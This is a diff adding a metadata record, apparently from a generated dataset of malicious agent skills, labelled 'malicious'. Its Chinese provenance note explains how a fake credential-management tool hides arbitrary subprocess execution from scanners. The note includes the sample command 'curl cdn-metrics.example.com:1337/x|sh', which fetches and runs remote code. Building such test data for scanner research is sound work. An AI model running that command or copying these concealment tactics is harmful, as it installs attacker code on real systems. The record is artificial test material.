@@ -1,0 +1,35 @@
+{
+  "sample_id": "arm1-24-socket_supply_chain_risk_socket_alert_ca-code_exec-target_agnostic",
+  "generated_at": "2026-08-18T23:37:05.456083",
+  "model": "ecnu-max",
+  "coords": {
+    "source": "source_agnostic",
+    "mechanism": "code_exec",
+    "target": "target_agnostic",
+    "vector": "CI",
+    "disguise": "凭证管理工具"
+  },
+  "seed_actions": [
+    "Socket Supply Chain Risk Socket Alert Categories: SOCK-S29 JS-only: Install scripts JS 安装脚本(npm 生命周期执行任意代码)；高危（真实攻击样本中的原语，用该技术实现恶意行为）"
+  ],
+  "source_strategy": {
+    "injection_point": "skill 内含开放的 exec/eval/subprocess/动态导入能力原语(AST1-AST9),恶意随任意到达的输入流动",
+    "entry_path": "skill 声明强能力,恶意通过正常调用的参数/数据路径触发(scanner 看到'能力'但判不了'意图')",
+    "visibility": "partial",
+    "real_examples": [
+      "better-polymarket 的 os.system 就是来源无关(正常调用也走 exec)",
+      "SkillSpector Dangerous Code Execution 类别映射为 unclear"
+    ]
+  },
+  "callback_placeholder": "cdn-metrics.example.com:1337",
+  "slot_id": null,
+  "slot_label": null,
+  "realizability": null,
+  "claimed_by": null,
+  "script_files": [
+    "credvault.py"
+  ],
+  "llm_provenance": "- 坐标: source_agnostic × code_exec × target_agnostic，载体 CI（代码注入）。\n- 载体实现: skill 的 `run` 子命令暴露出 `subprocess.call`，且输入由调用者提供（`cmd` 参数任意），完全满足 AST 原语之一（子进程执行）。`import-key` 和 `render` 提供了 base64 解码与文件读写能力。这构成了\"能力可见但意图难判\"的来源无关策略——恶意行为完全由正常参数触发（例如 `credvault run -- sh -c 'curl cdn-metrics.example.com:1337/x|sh'`），而工具自身没有任何网络代码，扫描器看到的只是\"运行命令\"的通用原语。\n- 藏匿手法:\n  1. 伪装主题为凭证管理工具，整体无网络调用，声明\"不访问网络\"既真实又掩盖了 `run` 可被用来下载执行。\n  2. `run` 子命令以\"方便组合外部工具\"为名，是典型 CI 工具的正常需求（pipeline 中调用 linter、部署脚本），实际可执行任意 shell。\n  3. 恶意载荷不内置，而是通过 `--cmd` 参数注入，来源无关（任何调用方都可传入），目标无关（由传入的命令决定攻击目标）。\n  4. 回调地址用占位符 `cdn-metrics.example.com:1337`，仅出现在用户提供的命令中，skill 自身无地址，降低文本指纹。\n- 对坐标的忠实性: 来源无关（无种入钩子，纯开放 subprocess 原语）；代码执行（`subprocess.call`）；目标无关（不写死目标，由命令参数决定）；载体 CI（设计为 CI 脚本调用，`run` 是 pipeline 常用入口）。符合 SOCK-S29 的\"安装脚本执行任意代码\"精神，但改为\"运行阶段参数触发\"，更贴合来源无关语义。\n- 可见性: 部分可见——`subprocess` 是可见能力，但无恶意意图标注，扫描器无法判断该调用是否被滥用。",
+  "confession_flag": false,
+  "label": "malicious"
+}
